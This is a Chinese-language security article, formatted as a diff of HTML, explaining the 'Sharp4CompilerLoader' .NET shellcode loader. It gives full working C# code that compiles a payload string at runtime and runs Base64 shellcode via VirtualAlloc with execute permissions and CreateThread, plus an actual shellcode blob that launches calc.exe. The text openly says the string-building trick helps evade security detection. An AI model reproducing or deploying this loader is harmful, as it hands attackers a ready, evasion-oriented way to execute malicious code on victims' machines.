@@ -1,0 +1,127 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>Sharp4CompilerLoader.exe 是一款通过动态编译.NET代码实现线程注入的加载器，主要功能是接收经过 Base64 编码的 shellcode 字符串，并将其注入到本地线程中，从而执行恶意代码。</p>
+<h3 data-content="1" id="4332091daeba475aaa76a3403f2a668d">0x01 VirtualAlloc 函数</h3>
+<p>VirtualAlloc 是 Windows API 中用于内存分配的函数，常用于分配和保护进程的虚拟内存空间。在.NET中可以通过 P/Invoke 调用的非托管函数，具体代码如下所示。</p>
+<div class="highlight"><pre><span></span><span class="na">[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]</span>
+<span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">UInt32</span> <span class="nf">VirtualAlloc</span><span class="p">(</span>
+    <span class="n">UInt32</span> <span class="n">lpStartAddr</span><span class="p">,</span>        <span class="c1">// 内存的起始地址</span>
+    <span class="n">UInt32</span> <span class="n">size</span><span class="p">,</span>               <span class="c1">// 要分配的内存大小（以字节为单位）</span>
+    <span class="n">UInt32</span> <span class="n">flAllocationType</span><span class="p">,</span>   <span class="c1">// 分配类型（如 MEM_COMMIT 或 MEM_RESERVE）</span>
+    <span class="n">UInt32</span> <span class="n">flProtect</span>           <span class="c1">// 内存保护属性（如 PAGE_EXECUTE_READWRITE）</span>
+<span class="p">);</span>
+</pre></div>
+<p>kernel32.dll 是 Windows 操作系统中提供核心功能的动态链接库之一，负责管理系统资源，如内存分配、线程管理、文件操作等。VirtualAlloc 是一种用于直接管理进程虚拟内存的函数，本质上属于内存管理功能，自然由 kernel32.dll 提供。因此，在.NET里通过[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)] 特性声明 Windows API。</p>
+<p>这里多提一点有关 DllImport 特性的知识，该特性提供了SetLastError 、ExactSpelling 两个选项，当 SetLastError 设置为 true时， 表示是否返回 GetLastError 的错误代码。而 ExactSpelling 选项，如果设置为 false（默认值），CLR 会允许某些平台上的名称修饰。例如，在 Windows 平台上，函数名可能以 A 或 W 结尾（分别表示 ANSI 和 Unicode 版本，如 CreateFileA 和 CreateFileW），两个选项的总结如下图所示。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241126142940-d0bd7f22-abbf-1.png"/></p>
+<p>而网络对抗实战中，VirtualAlloc 分配可执行内存，用于将解码后的 shellcode 写入内存，并通过线程或函数指针执行。以下是 VirtualAlloc 的详细介绍和参数说明</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241126143017-e715a60a-abbf-1.png"/></p>
+<h3 data-content="1" id="29bfe76025a65e73a72a08df41556139">0x02 CreateThread 函数</h3>
+<p>CreateThread 也是 Windows API 提供的函数，用于在目标进程中创建一个新的线程。通常在.NET里调用的方式如下所示。</p>
+<div class="highlight"><pre><span></span><span class="na">[DllImport("kernel32.dll", SetLastError = true)]</span>
+<span class="k">private</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">CreateThread</span><span class="p">(</span>
+    <span class="n">UInt32</span> <span class="n">lpThreadAttributes</span><span class="p">,</span>  <span class="c1">// 线程的安全属性</span>
+    <span class="n">UInt32</span> <span class="n">dwStackSize</span><span class="p">,</span>         <span class="c1">// 线程的初始堆栈大小</span>
+    <span class="n">UInt32</span> <span class="n">lpStartAddress</span><span class="p">,</span>      <span class="c1">// 线程的起始地址（函数指针）</span>
+    <span class="n">IntPtr</span> <span class="n">param</span><span class="p">,</span>               <span class="c1">// 传递给线程的参数</span>
+    <span class="n">UInt32</span> <span class="n">dwCreationFlags</span><span class="p">,</span>     <span class="c1">// 创建标志</span>
+    <span class="k">ref</span> <span class="n">UInt32</span> <span class="n">lpThreadId</span>       <span class="c1">// 接收线程 ID</span>
+<span class="p">);</span>
+</pre></div>
+<p>该函数通常与动态内存分配和 shellcode 执行结合使用，尤其是在渗透测试或恶意代码中，用于将 shellcode 注入到目标进程并执行。以下是 CreateThread 函数的详细参数说明，如下图所示。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241126143117-0ab16810-abc0-1.png"/></p>
+<h3 data-content="1" id="b420596e610508d1af2c33f0e303c14c">0x03 .NET动态编译技术</h3>
+<p>安全对抗阶段，有时我们需要在运行时动态编译代码并执行，.NET平台提供的CSharpCodeProvider 是一个编译服务的类，用于与底层的编译器交互，可以动态创建、编辑和编译代码。具体代码如下所示。</p>
+<div class="highlight"><pre><span></span><span class="k">private</span> <span class="k">static</span> <span class="n">Assembly</span> <span class="nf">BuildAssembly</span><span class="p">(</span><span class="kt">string</span> <span class="n">code</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="n">Microsoft</span><span class="p">.</span><span class="n">CSharp</span><span class="p">.</span><span class="n">CSharpCodeProvider</span> <span class="n">provider</span> <span class="p">=</span> <span class="k">new</span> <span class="n">CSharpCodeProvider</span><span class="p">();</span>
+    <span class="n">ICodeCompiler</span> <span class="n">compiler</span> <span class="p">=</span> <span class="n">provider</span><span class="p">.</span><span class="n">CreateCompiler</span><span class="p">();</span>
+    <span class="n">CompilerParameters</span> <span class="n">compilerparams</span> <span class="p">=</span> <span class="k">new</span> <span class="n">CompilerParameters</span><span class="p">();</span>
+    <span class="n">compilerparams</span><span class="p">.</span><span class="n">GenerateExecutable</span> <span class="p">=</span> <span class="k">false</span><span class="p">;</span>
+    <span class="n">compilerparams</span><span class="p">.</span><span class="n">GenerateInMemory</span> <span class="p">=</span> <span class="k">true</span><span class="p">;</span>
+    <span class="n">CompilerResults</span> <span class="n">results</span> <span class="p">=</span> <span class="n">compiler</span><span class="p">.</span><span class="n">CompileAssemblyFromSource</span><span class="p">(</span><span class="n">compilerparams</span><span class="p">,</span> <span class="n">code</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">results</span><span class="p">.</span><span class="n">CompiledAssembly</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>上述代码中，首先通过 ICodeCompiler 获取编译器接口，从 .NET Framework 3.5 开始，ICodeCompiler 已被标记为过时，但它仍适用于旧版本代码和兼容性场景。接着，设置编译的 GenerateExecutable 和 GenerateInMemory两个参数，GenerateExecutable = false：表示生成的是一个动态链接库 <em>.dll ，而非可执行文件 </em>.exe。GenerateInMemory = true：程序集直接加载到内存中，而不会保存到磁盘，提升安全性并避免文件残留。</p>
+<p>随后，通过 CompileAssemblyFromSource 方法接收编译参数和源代码字符串，将其动态编译为程序集，并且返回一个Assembly 对象。最后，这个对象可以用于反射调用动态生成的类型和方法，这里使用自定义的方法function1，具体代码如下所示.</p>
+<div class="highlight"><pre><span></span><span class="k">public</span> <span class="k">static</span> <span class="kt">object</span> <span class="nf">function1</span><span class="p">(</span><span class="kt">string</span> <span class="n">code</span><span class="p">,</span> <span class="kt">string</span> <span class="n">namespacename</span><span class="p">,</span> <span class="kt">string</span> <span class="n">classname</span><span class="p">,</span> <span class="kt">string</span> <span class="n">functionname</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">isstatic</span><span class="p">,</span> <span class="k">params</span> <span class="kt">object</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="kt">object</span> <span class="n">returnval</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
+    <span class="n">Assembly</span> <span class="n">asm</span> <span class="p">=</span> <span class="n">BuildAssembly</span><span class="p">(</span><span class="n">code</span><span class="p">);</span>
+    <span class="kt">object</span> <span class="n">instance</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
+    <span class="n">Type</span> <span class="n">type</span> <span class="p">=</span> <span class="k">null</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">isstatic</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="n">type</span> <span class="p">=</span> <span class="n">asm</span><span class="p">.</span><span class="n">GetType</span><span class="p">(</span><span class="n">namespacename</span> <span class="p">+</span> <span class="s">"."</span> <span class="p">+</span> <span class="n">classname</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+        <span class="n">instance</span> <span class="p">=</span> <span class="n">asm</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">namespacename</span> <span class="p">+</span> <span class="s">"."</span> <span class="p">+</span> <span class="n">classname</span><span class="p">);</span>
+        <span class="n">type</span> <span class="p">=</span> <span class="n">instance</span><span class="p">.</span><span class="n">GetType</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="n">MethodInfo</span> <span class="n">method</span> <span class="p">=</span> <span class="n">type</span><span class="p">.</span><span class="n">GetMethod</span><span class="p">(</span><span class="n">functionname</span><span class="p">);</span>
+    <span class="n">returnval</span> <span class="p">=</span> <span class="n">method</span><span class="p">.</span><span class="n">Invoke</span><span class="p">(</span><span class="n">instance</span><span class="p">,</span> <span class="n">args</span><span class="p">);</span>
+    <span class="k">return</span> <span class="n">returnval</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>上述代码中，通过 Type.GetMethod() 获取指定的方法信息，然后使用 MethodInfo.Invoke() 调用方法，不过做了一次判断，对于静态方法，调用时不需要实例，对于实例方法，需传入已创建的对象实例。</p>
+<h3 data-content="1" id="79be0a313feb38dda01e602672f2ef7b">0x04 编码实现</h3>
+<p>安全对抗阶段，我们可以声明一个字符串包含了需要被编译的.NET代码，因为都是字符串，所以可以添加一些特殊字符，将来编译的时候再过滤替换即可，这样便于绕过一些安全检测。</p>
+<div class="highlight"><pre><span></span><span class="kt">string</span> <span class="n">code</span><span class="p">=</span> <span class="s">@"</span>
+<span class="s">                using System;</span>
+<span class="s">                using System.Reflection;</span>
+<span class="s">                using System.Runtime.InteropServices;</span>
+
+<span class="s">                namespace Namespace</span>
+<span class="s">                {</span>
+<span class="s">                    class Program</span>
+<span class="s">                    {</span>
+<span class="s">                        private static UInt32 MEM_COMMIT = 0x1000;</span>
+<span class="s">                        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;</span>
+
+<span class="s">                        [DllImport(""kernel32"")]</span>
+<span class="s">                        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,</span>
+<span class="s">                                UInt32 size, UInt32 flAllocationType, UInt32 flProtect);</span>
+
+<span class="s">                        [DllImport(""kernel32"")]</span>
+<span class="s">                        private static extern IntPtr CreateThread(</span>
+<span class="s">                            UInt32 lpThreadAttributes,</span>
+<span class="s">                            UInt32 dwStackSize,</span>
+<span class="s">                            UInt32 lpStartAddress,</span>
+<span class="s">                            IntPtr param,</span>
+<span class="s">                            UInt32 dwCreationFlags,</span>
+<span class="s">                            ref UInt32 lpThreadId</span>
+<span class="s">                            );</span>
+
+<span class="s">                        [DllImport(""kernel32"")]</span>
+<span class="s">                        private static extern UInt32 WaitForSingleObject(</span>
+<span class="s">                            IntPtr hHandle,</span>
+<span class="s">                            UInt32 dwMilliseconds</span>
+<span class="s">                            );</span>
+
+<span class="s">                        public void run()</span>
+<span class="s">                        {</span>
+<span class="s">                            byte[] shellcode = Convert.FromBase64String("""</span>
+<span class="p">+</span> <span class="n">shellcodeBase64</span> <span class="p">+</span> <span class="s">@""");</span>
+<span class="s">                            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span>
+<span class="s">                            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span>
+<span class="s">                            IntPtr hThread = IntPtr.Zero;</span>
+<span class="s">                            UInt32 threadId = 0;</span>
+<span class="s">                            IntPtr pinfo = IntPtr.Zero;</span>
+<span class="s">                            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span>
+<span class="s">                            WaitForSingleObject(hThread, 0xFFFFFFFF);</span>
+<span class="s">                        }</span>
+<span class="s">                    }</span>
+<span class="s">                }"</span><span class="p">;</span>
+<span class="n">function1</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="s">"Namespace"</span><span class="p">,</span> <span class="s">"Program"</span><span class="p">,</span> <span class="s">"run"</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
+</pre></div>
+<p>上述代码中用 + 符号将字符串按需拼接，将 shellcodeBase64 变量的值嵌入到代码中，shellcodeBase64 的值 是一段基于Base64 编码的Shellcode，具体如下所示。</p>
+<div class="highlight"><pre><span></span>/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu/C1olZoppW9nf/VPAZ8CoD74HUFu0cTcm9qAFP/1WNhbGMuZXhlAA==
+</pre></div>
+<p>代码的末尾处，通过调用function1(code, "Namespace", "Program", "run", false, null); 实现动态编译执行，此处的 "run" 便是需要调用的方法名称，"Program" 是类的名称。运行后成功启动本地计算器进程，如下图所示。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241126143445-8685de94-abc0-1.png"/></p>
+<h3 data-content="1" id="fcdaca8d502736cb63b312803f43b3fd">0x05 小结</h3>
+<p>综上，Sharp4CompilerLoader 通过动态编译.NET代码实现线程注入的思路，其主要功能是接收经过 Base64 编码的 shellcode 字符串，并将其注入到本地线程中，从而执行恶意代码。</p>
+</div>
+</div>
